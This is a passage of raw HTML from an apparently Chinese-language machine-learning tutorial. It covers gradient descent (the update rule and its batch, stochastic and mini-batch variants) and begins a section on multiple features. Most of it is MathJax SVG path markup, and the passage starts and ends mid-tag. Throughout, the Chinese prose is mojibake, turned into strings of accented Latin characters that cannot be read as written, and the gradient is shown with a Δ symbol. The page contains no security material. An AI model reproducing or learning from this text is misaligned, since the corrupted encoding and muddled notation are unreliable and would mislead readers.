absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>i</mi></math></mjx-assistive-mml></mjx-container>ä¸ªæ ·æœ¬çš„é¢„æµ‹å€¼</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="3.093ex" height="2.485ex" role="img" focusable="false" viewbox="0 -893.3 1367.1 1098.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(523,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>y</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></math></mjx-assistive-mml></mjx-container>ï¼šç¬¬<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.781ex" height="1.52ex" role="img" focusable="false" viewbox="0 -661 345 672" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>i</mi></math></mjx-assistive-mml></mjx-container>ä¸ªæ ·æœ¬çš„çœŸå®å€¼</li></ul><h2 id="æ¢¯åº¦ä¸‹é™-Gradient-Descent">æ¢¯åº¦ä¸‹é™(Gradient Descent)</h2><p>æ¢¯åº¦ä¸‹é™ï¼ˆGradient Descentï¼‰æ˜¯ä¸€ç§<strong>ä¼˜åŒ–ç®—æ³•</strong>ï¼Œç”¨äº<strong>æœ€å°åŒ–æŸå¤±å‡½æ•°</strong>ï¼Œåœ¨æœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ ä¸­å¹¿æ³›åº”ç”¨ã€‚</p><p>æ ¸å¿ƒæ€æƒ³ï¼š<strong>æ²¿ç€æŸå¤±å‡½æ•°æ¢¯åº¦ä¸‹é™çš„æ–¹å‘ï¼Œé€æ­¥æ›´æ–°å‚æ•°ï¼Œä½¿æŸå¤±å‡½æ•°çš„å€¼æœ€å°åŒ–</strong>ã€‚</p><h3 id="åŸç†">åŸç†</h3><ul><li>è®¡ç®—æŸå¤±å‡½æ•°çš„æ¢¯åº¦</li></ul><p>é€šè¿‡å¯¹æŸå¤±å‡½æ•°<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.253ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 1880 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(633,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1022,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1491,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>J</mi><mo stretchy="false">(</mo><mi>Î¸</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>è®¡ç®—åå¯¼ï¼Œå¾—åˆ°å‚æ•°<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.061ex" height="1.618ex" role="img" focusable="false" viewbox="0 -705 469 715" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>Î¸</mi></math></mjx-assistive-mml></mjx-container>å¯¹åº”çš„æ¢¯åº¦<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.138ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2713 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1466,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1855,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2324,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="normal">Î”</mi><mi>J</mi><mo stretchy="false">(</mo><mi>Î¸</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>ã€‚</p><ul><li>æ›´æ–°å‚æ•°</li></ul><p>ä½¿ç”¨å­¦ä¹ ç‡<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.448ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 640 453" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>Î±</mi></math></mjx-assistive-mml></mjx-container>ï¼ˆLearning Rateï¼‰ï¼ˆæ­¥é•¿ï¼‰æ²¿æ¢¯åº¦çš„æ–¹å‘æ›´æ–°å‚æ•°</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="15.491ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 6847 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(746.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1802.6,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2493.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(3494,0)"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4134,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4967,0)"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5600,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(5989,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6458,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>Î¸</mi><mo>=</mo><mi>Î¸</mi><mo>âˆ’</mo><mi>Î±</mi><mi mathvariant="normal">Î”</mi><mi>J</mi><mo stretchy="false">(</mo><mi>Î¸</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><p>è¿™é‡Œï¼Œ<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.138ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2713 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(833,0)"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1466,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1855,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2324,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi mathvariant="normal">Î”</mi><mi>J</mi><mo stretchy="false">(</mo><mi>Î¸</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>æŒ‡ç¤ºäº†æŸå¤±å‡½æ•°ä¸Šå‡æœ€å¿«çš„æ–¹å‘ï¼Œè´Ÿå·è¡¨ç¤ºå‘ä¸‹é™çš„æ–¹å‘ç§»åŠ¨ã€‚</p><ul><li>é‡å¤è¿­ä»£ï¼Œç›´è‡³æ”¶æ•›</li></ul><p>æŒç»­æ›´æ–°å‚æ•°ï¼ŒçŸ¥é“æŸå¤±å‡½æ•°çš„å˜åŒ–è¶³å¤Ÿå°ï¼ˆæˆ–è€…è¾¾åˆ°é¢„è®¾çš„è¿­ä»£æ¬¡æ•°ï¼‰ã€‚</p><h3 id="æ¢¯åº¦ä¸‹é™çš„ä¸‰ç§ç±»å‹">æ¢¯åº¦ä¸‹é™çš„ä¸‰ç§ç±»å‹</h3><ol><li><p><strong>æ‰¹é‡æ¢¯åº¦ä¸‹é™ï¼ˆBGD, Batch Gradient Descentï¼‰</strong></p><ul><li><p>è®¡ç®—æ•´ä¸ªè®­ç»ƒé›†ä¸Šçš„æ¢¯åº¦ï¼Œæ±‚å‡å€¼åæ›´æ–°å‚æ•°ã€‚</p></li><li><p><strong>ä¼˜ç‚¹</strong>ï¼šæ”¶æ•›ç¨³å®š</p></li><li><p><strong>ç¼ºç‚¹</strong>ï¼šè®¡ç®—é‡å¤§ï¼Œä¸é€‚åˆå¤§è§„æ¨¡æ•°æ®</p></li></ul></li><li><p><strong>éšæœºæ¢¯åº¦ä¸‹é™ï¼ˆSGD, Stochastic Gradient Descentï¼‰</strong></p><ul><li>æ¯æ¬¡ä»…ä½¿ç”¨<strong>ä¸€ä¸ªæ ·æœ¬</strong>æ¥æ›´æ–°å‚æ•°ï¼Œæ›´æ–°æ›´å¿«ã€‚</li><li><strong>ä¼˜ç‚¹</strong>ï¼šè®¡ç®—å¿«ï¼Œé€‚åˆå¤§è§„æ¨¡æ•°æ®</li><li><strong>ç¼ºç‚¹</strong>ï¼šæ›´æ–°ä¸ç¨³å®šï¼Œå¯èƒ½éœ‡è¡ä¸æ”¶æ•›</li></ul></li><li><p><strong>å°æ‰¹é‡æ¢¯åº¦ä¸‹é™ï¼ˆMBGD, Mini-batch Gradient Descentï¼‰</strong></p><ul><li>ä»‹äºæ‰¹é‡å’Œéšæœºä¹‹é—´ï¼Œæ¯æ¬¡ä½¿ç”¨ä¸€ä¸ªå°æ‰¹é‡æ•°æ®ï¼ˆå¦‚ 32ã€64 ä¸ªæ ·æœ¬ï¼‰è®¡ç®—æ¢¯åº¦ã€‚</li><li><strong>ä¼˜ç‚¹</strong>ï¼šè®¡ç®—ç¨³å®šï¼Œæ”¶æ•›å¿«ï¼Œé€‚åˆå¤§æ•°æ®</li></ul></li></ol><h2 id="å¤šç‰¹å¾-Multiple-Features">å¤šç‰¹å¾(Multiple Features)</h2><p><strong>å¤šç‰¹å¾</strong>ï¼Œåœ¨æœºå™¨å­¦ä¹ é‡Œï¼ŒæŒ‡çš„æ˜¯æ¯ä¸ªæ ·æœ¬ï¼ˆæ•°æ®ç‚¹ï¼‰æœ‰<strong>å¤šä¸ªå±æ€§æˆ–å˜é‡</strong>æ¥æè¿°å®ƒã€‚</p><p>æ¯”å¦‚ï¼Œä½ æƒ³è®­ç»ƒä¸€ä¸ªæ¨¡å‹é¢„æµ‹æˆ¿ä»·ï¼š</p><ul><li>ä¸€ä¸ªæˆ¿å­å¯ä»¥æœ‰å¾ˆå¤šç‰¹å¾ï¼ˆFeatureï¼‰ï¼Œæ¯”å¦‚ï¼šé¢ç§¯ã€æ¥¼å±‚ã€å»ºé€ å¹´ä»½ã€è·ç¦»åœ°é“çš„è·ç¦»ã€è£…ä¿®æƒ…å†µç­‰ç­‰ã€‚</li><li>æ¯ä¸€ä¸ªç‰¹å¾å°±æ˜¯ä¸€ä¸ªå½±å“é¢„æµ‹ç»“æœçš„å› ç´ ã€‚</li><li>è¿™äº›ç‰¹å¾åŠ åœ¨ä¸€èµ·ï¼Œå°±å«<strong>å¤šç‰¹å¾</strong>ï¼ˆmulti-featureï¼‰ã€‚</li></ul><p>ç®€å•ç†è§£å°±æ˜¯ï¼š</p><blockquote><p>ä¸€ä¸ªæ ·æœ¬ä¸åªç”¨ä¸€ä¸ªæ•°å­—æè¿°ï¼Œè€Œæ˜¯ç”¨ä¸€ç»„æ•°å­—æˆ–å±æ€§æ¥æè¿°ã€‚</p></blockquote><p>åœ¨æ•°å­¦ä¸Šï¼Œä¸€èˆ¬ç”¨ä¸€ä¸ªå‘é‡æ¥è¡¨ç¤ºï¼Œæ¯”å¦‚ï¼š</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="54.213ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 23962.2 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 